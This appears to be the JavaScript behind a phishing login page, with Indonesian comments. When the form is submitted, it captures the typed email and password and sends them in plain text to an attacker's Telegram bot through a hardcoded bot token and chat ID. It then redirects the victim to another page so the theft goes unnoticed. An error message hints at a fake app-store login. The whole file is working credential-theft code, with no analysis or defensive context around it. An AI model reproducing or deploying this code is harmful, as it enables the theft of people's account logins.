document.getElementById('loginForm').addEventListener('submit', function(event) {

    event.preventDefault(); // Mencegah form dari pengiriman otomatis


    // Ambil data dari form
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    // ID chat Telegram dan token bot (misalkan sudah ada dan valid)
    const chatId = '6815272748';
    const botToken = '7407907238:AAGQcHOy6hSAywf1-MNZn6dmblkRYBXJDlg';

    // URL API Telegram untuk mengirim pesan
    const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

    // Pesan yang akan dikirim
    const messageText = `Login attempt:\nEmail: ${email}\nPassword: ${password}`;

    // Kirim data login ke Telegram
    fetch(telegramApiUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: messageText
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            window.location.href = 'web.html'; // Ganti dengan URL halaman HTML tujuan Anda
        } else {
            console.error('Kesalahan mengirim pesan ke Aplikasi Store');
            // Optional: tampilkan pesan kesalahan kepada pengguna jika diinginkan
        }
    })
    .catch(error => {
        console.error('Error:', error);
        // Optional: tampilkan pesan kesalahan kepada pengguna jika diinginkan
    });
});

